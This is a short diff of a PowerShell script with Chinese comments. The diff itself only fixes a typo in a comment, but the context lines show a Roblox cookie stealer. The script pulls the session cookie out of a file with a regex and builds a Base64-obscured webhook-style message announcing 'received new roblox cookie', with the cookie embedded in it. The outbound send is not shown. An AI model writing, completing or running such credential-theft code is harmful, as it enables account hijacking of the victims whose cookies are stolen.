@@ -17,7 +17,7 @@ if (Test-Path $p) {
             $cookie = $matches[1]
 
             # 3. 準備發送資料
-            # Base64 內容：{"title": "接收到新的robux cookie", ...}
+            # Base64 內容：{"title": "接收到新的roblox cookie", ...}
             $embedBase64 = "eyJ0aXRsZSI6ICLmjqXmlLbliLDmlrDnmoRyb2Jsb3ggY29va2llIiwgImNvbG9yIjogMzQ0NzAwMywgImZpZWxkcyI6IFt7Im5hbWUiOiAiY29va2llIiwgInZhbHVlIjogImBgYCRjb29raWVgYGAifV0sICJmb290ZXIiOiB7InRleHQiOiAi5Y+v5Lul55uh5oOF5L2/55SoIn19"
             $decodedJson = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($embedBase64))
             
